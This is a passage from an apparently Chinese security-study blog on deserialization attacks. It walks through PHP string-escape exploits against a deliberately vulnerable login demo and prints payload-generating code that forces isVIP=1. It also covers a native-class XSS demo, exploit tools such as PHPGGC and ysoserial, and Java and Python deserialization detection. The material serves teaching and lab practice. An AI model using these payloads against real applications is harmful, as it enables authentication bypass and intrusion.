class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br><br><br><span class="hljs-comment">//$u=&#x27;admin&#x27;;</span><br><span class="hljs-comment">//$p=&#x27;123456&#x27;;</span><br><br><span class="hljs-comment">////无过滤序列化数据数据显示</span><br><span class="hljs-comment">//$obj = new user($u,$p);</span><br><span class="hljs-comment">//$obj = serialize($obj);</span><br><span class="hljs-comment">//echo $obj;</span><br><span class="hljs-comment">//echo &quot;\n&quot;;</span><br><br><span class="hljs-comment">////无过滤反序列化数据数据显示</span><br><span class="hljs-comment">//var_dump(unserialize($obj));</span><br><span class="hljs-comment">//echo &quot;\n&quot;;</span><br><br><span class="hljs-comment">//有过滤反序列化数据数据显示</span><br><span class="hljs-comment">//$obj1 = filter(serialize($obj));</span><br><span class="hljs-comment">//echo $obj1;</span><br><span class="hljs-comment">//var_dump(unserialize($obj1));</span><br><br><span class="hljs-variable">$obj</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$obj</span>))&#123;<br>    <span class="hljs-variable">$o</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$obj</span>);<br>    <span class="hljs-variable">$o</span>-&gt;<span class="hljs-title function_ invoke__">login</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p> 发现若要成功输出<code>flag is niubi</code>​则需让<code>$isVIP</code>​值为1且<code>$username</code>​的值为admin</p>
+<p> 若要实现这些条件则要执行<code>login()</code>​函数,其执行需要调用GET传参中的x，并对其进行反序列化操作</p>
+</li>
+<li><p>根据源码得到正确的序列化语句</p>
+<p> ​<code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​</p>
+</li>
+<li><p>但是由于源码过滤会将admin替换为hacker</p>
+<p> ​<code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​</p>
+</li>
+<li><p>由于变量长度比变量名称小而出错即只能正常运行到<code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacke</code>​而到后面的内容就会出错，所以我们尝试让后面的<code>r&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​实现逃逸并成功执行，让r为开始肯定会报错，所以选择<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​这47位，在构造pop链过程中，每写一个admin就会替换为hacker即多一位</p>
+<p> 所以我们需要47个admin，这样就会替换为47个hacker，即多出47位刚好等于<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​</p>
+<p> 可以理解为</p>
+<p> 47 x <code>admin</code>​&#x3D;47 x 5 +<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​ &#x3D; 47 x 6 位</p>
+<p> 47 x <code>hacker</code>​&#x3D; 47 x 6 位</p>
+</li>
+<li><p>构造pop链,修改$isVIP的值为1</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>=<span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>, <span class="hljs-variable">$p</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br><br><span class="hljs-variable">$u</span>=<span class="hljs-string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>;<br><span class="hljs-variable">$p</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br><br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span>);<br><span class="hljs-comment">//echo serialize($obj);</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>));<br><br><br><span class="hljs-comment">//生成O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</span><br><br></code></pre></td></tr></table></figure></li>
+<li><p>传参</p>
+<p> ​<img src="/assets/image-20240831185310-rljruv5.png" srcset="/img/loading.gif" lazyload alt="image-20240831185310-rljruv5">​</p>
+</li>
+</ol>
+<p>‍</p>
+<h4 id="减少"><a href="#减少" class="headerlink" title="减少"></a>减少</h4><ol>
+<li><p>观察源码</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>, <span class="hljs-variable">$p</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$isVip</span>=<span class="hljs-variable language_">$this</span>-&gt;isVIP;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$isVip</span>==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag is niubi&#x27;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/admin/&quot;</span>,<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-variable">$obj</span>);<br>&#125;<br><br><span class="hljs-variable">$obj</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$obj</span>))&#123;<br>    <span class="hljs-variable">$o</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$obj</span>);<br>    <span class="hljs-variable">$o</span>-&gt;<span class="hljs-title function_ invoke__">login</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>根据源码得到正确的序列化语句</p>
+<p> ​<code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​</p>
+</li>
+<li><p>但是由于源码过滤会将admin替换为hack</p>
+<p> ​<code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hack&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​</p>
+</li>
+<li><p>由于变量长度比变量名称大而出错即只能正常运行到<code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hack</code>​而到后面的内容就会出错，所以我们尝试让后面的<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;</code>​实现逃逸并成功执行，这里就要问了，为什么不像上面一样<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>​使用到最后，而是到123456（password的值）就停止了呢，这是因为123456是我们能控制的值前面停到hack最后，所以就这22位，同理构造pop链</p>
+</li>
+<li><p>构造代码</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<br><br><span class="hljs-variable">$u</span>=<span class="hljs-string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>;<br><span class="hljs-variable">$p</span>=<span class="hljs-string">&#x27;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span>);<br><span class="hljs-variable">$a_seri</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$a_seri_filter</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a_seri</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a_seri_filter</span>;<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>‍</p>
+<h3 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h3><p>好文：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/264823">浅析PHP原生类-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p>查询原生类的使用<a target="_blank" rel="noopener" href="https://www.php.net/docs.php">PHP: Documentation</a></p>
+<p>应用场景：</p>
+<p>在代码中没有看到魔术方法的情况下使用的</p>
+<h5 id="生成原生类脚本代码"><a href="#生成原生类脚本代码" class="headerlink" title="生成原生类脚本代码"></a>生成原生类脚本代码</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$classes</span> = <span class="hljs-title function_ invoke__">get_declared_classes</span>();<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;<br>    <span class="hljs-variable">$methods</span> = <span class="hljs-title function_ invoke__">get_class_methods</span>(<span class="hljs-variable">$class</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;__destruct&#x27;</span>,<br>            <span class="hljs-string">&#x27;__toString&#x27;</span>,<br>            <span class="hljs-string">&#x27;__wakeup&#x27;</span>,<br>            <span class="hljs-string">&#x27;__call&#x27;</span>,<br>            <span class="hljs-string">&#x27;__callStatic&#x27;</span>,<br>            <span class="hljs-string">&#x27;__get&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set&#x27;</span>,<br>            <span class="hljs-string">&#x27;__isset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__unset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__invoke&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set_state&#x27;</span><br>        ))) &#123;<br>            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20240831193610-cby2g2l.png" srcset="/img/loading.gif" lazyload alt="image-20240831193610-cby2g2l">​</p>
+<p>​<img src="/assets/image-20240831193546-7af979q.png" srcset="/img/loading.gif" lazyload alt="image-20240831193546-7af979q">​</p>
+<p>​<img src="/assets/image-20240831193654-reiyfwx.png" srcset="/img/loading.gif" lazyload alt="image-20240831193654-reiyfwx">​</p>
+<h5 id="原生类—xss本地demo示例"><a href="#原生类—xss本地demo示例" class="headerlink" title="原生类—xss本地demo示例"></a>原生类—xss本地demo示例</h5><p>ysl_xssdemo.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;k&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>pop链构造</p>
+<p>​<img src="/assets/image-20240831194118-6uo31uf.png" srcset="/img/loading.gif" lazyload alt="image-20240831194118-6uo31uf">​</p>
+<p>​<img src="/assets/image-20240831194152-ytw7keo.png" srcset="/img/loading.gif" lazyload alt="image-20240831194152-ytw7keo">​</p>
+<h5 id="CTFshow示例"><a href="#CTFshow示例" class="headerlink" title="CTFshow示例"></a>CTFshow示例</h5><p>见环境复现</p>
+<p>‍</p>
+<h3 id="框架类"><a href="#框架类" class="headerlink" title="框架类"></a>框架类</h3><p>介绍了两个工具项目</p>
+<ul>
+<li><p>NotSoSecure(综合类)</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/NotSoSecure/SerializedPayloadGenerator">https://github.com/NotSoSecure/SerializedPayloadGenerator</a></p>
+<p>自己在服务器上搭建</p>
+<p>可能会出问题这里有解决方案<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hanlei-/p/10950481.html">Windows Server2012 R2 无法安装.NET Framework 3.5的解决方法 - __小白菜 - 博客园 (cnblogs.com)</a></p>
+</li>
+<li><p>PHPGGC(单项类)</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a> &#x2F;&#x2F;推荐安装在kali上</p>
+</li>
+</ul>
+<p>还有对ThinkPHP&amp;Yii&amp;Laravel这三个框架的简单利用，详见环境复现</p>
+<p>‍</p>
+<h2 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h2><h3 id="原生反序列化"><a href="#原生反序列化" class="headerlink" title="原生反序列化"></a>原生反序列化</h3><p>JAVA常见的序列化和反序列化的方法有<code>JAVA 原生序列化</code>​和<code>JSON 类（fastjson、jackson）</code>​序列化两种方式。</p>
+<p>两种方式做的事情都是一样的，为什么要区分开来？</p>
+<blockquote>
+<p>因为利用起来有所不同<br>fastjson、jackson等反序列化就用网上给的EXP、POC去测试<br>java原生类反序列化就会用到专门工具(ysoserial)去生成payload去测试</p>
+</blockquote>
+<p>java 序列化的数据一般会以标记<code>ac ed 00 05</code>​开头，base64 编码的特征为<code>rO0AB</code>​</p>
+<p>黑盒发现（流量捕获到特征<code>ac ed 00 05、rO0AB</code>​）<br>白盒发现（特征类接口函数）</p>
+<p>‍</p>
+<h4 id="原生序列化类函数"><a href="#原生序列化类函数" class="headerlink" title="原生序列化类函数"></a>原生序列化类函数</h4><ul>
+<li><h5 id="SnakeYaml​"><a href="#SnakeYaml​" class="headerlink" title="SnakeYaml​"></a><code>SnakeYaml</code>​</h5><p>完整的 YAML1.1 规范 Processor，支持 Java 对象的序列化&#x2F;反序列化</p>
+<p>​<img src="/assets/image-20240906194551-0w29dhd.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240906195035-fu26709.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240906195014-eeb0zv5.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><h5 id="XMLDecoder​"><a href="#XMLDecoder​" class="headerlink" title="XMLDecoder​"></a><code>XMLDecoder</code>​</h5><p>xml 语言格式序列化类函数接口</p>
+<p>​<img src="/assets/image-20240906195102-hlnjnai.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240906195424-pyvvs6b.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><h5 id="ObjectInputStream-readObject-​"><a href="#ObjectInputStream-readObject-​" class="headerlink" title="ObjectInputStream.readObject()​"></a><code>ObjectInputStream.readObject()</code>​</h5><p>任何类如果想要序列化必须实现 <code>java.io.Serializable</code>​ 接口</p>
+<p>​<img src="/assets/image-20240906195507-7gikw7a.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240906200235-5zgv5i0.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240906195930-i238u5g.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>​<img src="/assets/image-20240906200201-1q0kwed.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240906200505-6uai4nn.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240906200421-kayznfy.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20240906200437-u8rlp6o.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+</ul>
+<p>‍</p>
+<h4 id="利用项目"><a href="#利用项目" class="headerlink" title="利用项目"></a>利用项目</h4><ul>
+<li><p>Yakit<br><a target="_blank" rel="noopener" href="https://yaklang.com/">https://yaklang.com</a>&#x2F; &#x2F;&#x2F;集成了ysoserial工具，图形化生成，推荐使用</p>
+</li>
+<li><p>ysoserial<br><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> &#x2F;&#x2F;命令生成工具，不推荐使用</p>
+</li>
+<li><p>SerializedPayloadGenerator<br><a target="_blank" rel="noopener" href="https://github.com/NotSoSecure/SerializedPayloadGenerator">https://github.com/NotSoSecure/SerializedPayloadGenerator</a> &#x2F;&#x2F;集成了ysoserial工具，网页图形化，推荐使用</p>
+</li>
+</ul>
+<p>‍</p>
+<h4 id="JSON-类反序列化"><a href="#JSON-类反序列化" class="headerlink" title="JSON 类反序列化"></a>JSON 类反序列化</h4><ol>
+<li><p>Jackson</p>
+<p> 当下流行的json解释器，主要负责处理Json的序列化和反序列化。<br> 历史漏洞：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/search?q=Jackson">https://avd.aliyun.com/search?q=Jackson</a></p>
+<p> ​<img src="/assets/image-20240906160647-khovgvr.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> ​<img src="/assets/image-20240906160708-feu51s2.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> ​<img src="/assets/image-20240906160726-y2cf5ug.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> ​<img src="/assets/image-20240906160805-p7s2rx9.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>FastJson（有环境复现）</p>
+<p> 阿里巴巴公司开源的json解析器，它可以解析JSON格式的字符串，支持将JavaBean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
+<p> 历史漏洞：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/search?q=fastjson">https://avd.aliyun.com/search?q=fastjson</a></p>
+<p> ​<img src="/assets/image-20240906160839-85do8vl.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> ​<img src="/assets/image-20240906160911-b2tzs1u.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> ​<img src="/assets/image-20240906160924-xdbazlz.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> ​<img src="/assets/image-20240906160940-1lajn0w.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>XStream</p>
+<p> 开源Java类库，能将对象序列化成XML或XML反序列化为对象<br> 历史漏洞：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/search?q=XStream">https://avd.aliyun.com/search?q=XStream</a></p>
+<p> ​<img src="/assets/image-20240906161025-5u7sm39.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> ​<img src="/assets/image-20240906161038-6rseah1.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+</ol>
+<p>‍</p>
+<p>‍</p>
+<h2 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h2><p>‍</p>
+<h3 id="PYC-反编译文件出源码"><a href="#PYC-反编译文件出源码" class="headerlink" title="PYC - 反编译文件出源码"></a>PYC - 反编译文件出源码</h3><pre><code class="hljs">pyc 文件是 py 文件编译后生成的字节码文件 (byte code)，pyc 文件经过 python 解释器最终会生成机器码运行。因此 pyc 文件是可以跨平台部署的，类似 Java 的.class 文件，一般 py 文件改变后，都会重新生成 pyc 文件。
+</code></pre>
+<p>‍</p>
+<p>‍</p>
+<h3 id="常用-反-序列化函数"><a href="#常用-反-序列化函数" class="headerlink" title="常用 (反) 序列化函数"></a>常用 (反) 序列化函数</h3><ul>
+<li>pickle.dump (obj, file) : 将对象序列化后保存到文件</li>
+<li>pickle.load (file) : 将文件序列化内容反序列化为对象</li>
+<li>pickle.dumps (obj) : 将对象序列化成字符串格式的字节流</li>
+<li>pickle.loads (bytes_obj) : 将字符串字节流反序列化为对象</li>
+<li>PyYAML yaml.load()</li>
+<li>JSON json.loads(s)</li>
+<li>marsha</li>
+</ul>
+<p>‍</p>
+<h3 id="魔术方法-1"><a href="#魔术方法-1" class="headerlink" title="魔术方法"></a>魔术方法</h3><ul>
+<li><p>反序列化时调用：</p>
+<ul>
+<li><p>reduce () 反序列化时调用</p>
+</li>
+<li><p>reduce_ex () 反序列化时调用</p>
+<ul>
+<li>发现前面这两个同时都有的时候，执行 reduce_ex 里面的，不执行 reduce 的</li>
+</ul>
+</li>
+<li><p>setstate () 反序列化时调用（类似于 php 的 isset 被设置）</p>
+<ul>
+<li>这个小迪没测试出来，貌似有点问题</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>序列化时调用：</p>
+<ul>
+<li><p>getstate () 序列化时调用</p>
+<ul>
+<li>这个我测试的时候是只要有 reduce 或者 reduce_ex 就不会执行</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>‍</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul>
+<li>白盒直接搜索关键函数即可</li>
+<li>黑盒：Python 反序列化特征：base64 编码 前面 gA 固定（序列化数据）<br>测试：直接提交构造的 payload 测试</li>
+</ul>
+<p>‍</p>
+<p>‍</p>
